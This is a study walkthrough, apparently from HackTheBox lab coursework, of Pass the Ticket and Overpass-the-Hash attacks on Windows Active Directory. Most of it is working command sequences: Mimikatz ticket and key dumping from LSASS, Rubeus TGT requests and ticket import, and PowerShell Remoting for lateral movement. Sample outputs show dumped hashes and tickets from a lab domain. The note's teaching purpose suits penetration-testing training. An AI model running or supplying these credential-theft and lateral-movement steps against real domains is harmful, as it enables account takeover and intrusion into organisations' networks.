==[[Demo PtT Windows]]==

 [Pass the Ticket (PtT) attack](https://attack.mitre.org/techniques/T1550/003/)
 Use a stolen Kerberos ticket to move laterally instead of NTLM hash.

### Kerberos
Instead of giving passwords to services, give tickets.

##### 1. TGT - Ticket Granting Ticket
The first ticket obtained on a Kerberos system. The TGT permits the client to obtain additional Kerberos tickets or ==TGS==.

##### 2. TGS - Ticket Granting Service
Requested by users who want to use a service, used to verify the user's identity.

##### To Request a TGT:
1. User authenticates to DC by encrypting current timestamp with their password hash
2. DC authenticates identity since it knows user's password hash
3. DC sends TGT to user for future requests

##### If a user wants to connect to an MSSQL Database (service):
1. Request a Ticket Granting Service (TGS) to the Key Distribution Center (KDC)
2. Present Ticket Granting Ticket (TGT) to KDC
3. TGS gets sent to the MSSQL database server for authentication


### Pass the Ticket Attack
- We need either a ==TGT== or a ==TGS== for access to all the user's services or a specific resource.

#### Tools:
1. Mimikatz
2. Rubeus

### Harvesting Kerberos Tickets from a Windows Machine
- Tickets are processed and stored by LSASS
	- Non-administrative user = only your tickets
	- Local administrative user = everything

#### Mimikatz
**Needs local administrator for all tickets.**
==sekurlsa::tickets /export== module

1. `mimikatz.exe`
2. `privilege::debug`
3. `sekurlsa::tickets /export`

- $ = computer account, needs ticket to interact with AD
- User tickets = username@service-domain.local.kirbi

#### Rubeus
**Needs local administrator.**
`Rubeus.exe dump /nowrap`

## Pass the Key/OverPass the Hash
- Converts a hash/key for a domain-joined user into a full TGT.
- Requires user's hash

##### 1. Use Mimikatz to Extract All Users' Kerberos Keys
`mimikatz.exe`
`privilege::debug`
`sekurlsa::ekeys`

Output:
```cmd
Authentication Id : 0 ; 444066 (00000000:0006c6a2)
Session           : Interactive from 1
User Name         : plaintext
Domain            : HTB
Logon Server      : DC01
Logon Time        : 7/12/2022 9:42:15 AM
SID               : S-1-5-21-228825152-3134732153-3833540767-1107

         * Username : plaintext
         * Domain   : inlanefreight.htb
         * Password : (null)
         * Key List :
           aes256_hmac       b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60
           rc4_hmac_nt       3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_old      3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_md4           3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_nt_exp   3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_old_exp  3f74aa8f08f712f09cd5177b5c1ce50f
```

Now we have access to the ==AES256_HMAC and RC4_HMAC== keys, which we can abuse with mimikatz and Rubeus.

##### 2. Mimikatz - Pass the Key/OverPass the Hash
`mimikatz.exe`
`privilege::debug`
`sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f`

This will spawn a cmd.exe window as the user "plaintext".

##### 2. Rubeus - Pass the Key/OverPass the Hash
Input:
```cmd-session
Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```
 
Output:
```cmd-session
doIE1jCCBNKgAwIBBaEDA...

  ServiceName           :  krbtgt/inlanefreight.htb
  ServiceRealm          :  inlanefreight.htb
  UserName              :  plaintext
  UserRealm             :  inlanefreight.htb
  StartTime             :  7/12/2022 11:28:26 AM
  EndTime               :  7/12/2022 9:28:26 PM
  RenewTill             :  7/19/2022 11:28:26 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType               :  rc4_hmac
  Base64(key)           :  0TOKzUHdgBQKMk8+xmOV2w==
```

**NOTE:** Mimikatz requires administrative rights, Rubeus doesn't. More [here](https://github.com/GhostPack/Rubeus#example-over-pass-the-hash) 

**Note:** Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges. If we use a rc4_hmac (NTLM) hash in a Kerberos exchange instead of an aes256_cts_hmac_sha1 (or aes128) key, it may be detected as an "encryption downgrade."

## 3. Pass the Ticket (PtT)
Now that we have the ticket, either using mimikatz or Rubeus, we can move laterally.

#### Rubeus

***Use the switch ==/ptt== to submit the ticket (TGT or TGS) to the current logon session in Rubeus***
```cmd-session
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```

We should get:
```cmd-session
[+] Ticket successfully imported!
```

==OR== if we already have the ticket, import the .kirbi file exported from mimikatz

```cmd-session
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```

We can also use the base64 output from Rubeus or convert a .kirbi to base64 to perform the attack.

###### Powershell .kirbi to Base64:
```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```

###### Rubeus Pass the Ticket - Base64
```cmd-session
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>
```

#### Mimikatz - Pass the Ticket
##### Use mimikatz to PtT with .kirbi file
`mimikatz.exe`
`privilege::debug`
`kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"`

**Note:** Instead of opening mimikatz.exe with cmd.exe and exiting to get the ticket into the current command prompt, we can use the Mimikatz module `misc` to launch a new command prompt window with the imported ticket using the `misc::cmd` command.


## Pass the Ticket with PowerShell Remoting (Windows)
[PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2)

Two listeners are started:
1. HTTP/5985
2. HTTPS/5986

Requirements to create a PowerShell Remoting Session:
1. Administrator privileges
2. Member of Remote Management Users group
or 
1. Explicit PowerShell Remoting permissions in your session configuration

Useful if:
- Non-administrative user account is found with Remote Management Users membership

#### Mimikatz - PowerShell Remoting with Pass the Ticket
Steps:
1. Use mimikatz to import our ticket
`mimikatz.exe`

`privilege::debug`

`kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"`

`exit`

2. PowerShell connect to target machine
`powershell`

`Enter-PSSession -Computername <target>`

#### Rubeus - PowerShell Remoting with Pass the Ticket
Rubeus has the option `createnetonly`, which creates a sacrificial process/logon session ([Logon type 9](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)). The process is hidden by default, but we can specify the flag `/show` to display the process, and the result is the equivalent of `runas /netonly`. This prevents the erasure of existing TGTs for the current logon session.

1. Create a sacrificial process with Rubeus
`Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show`

**Note:** This command will open a new cmd window. In Step 2, in the new window, we'll execute Rubeus to request a new TGT with `/ptt` to import the ticket, then PowerShell Remote to the DC.

2. Pass the ticket for lateral movement
`Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt`
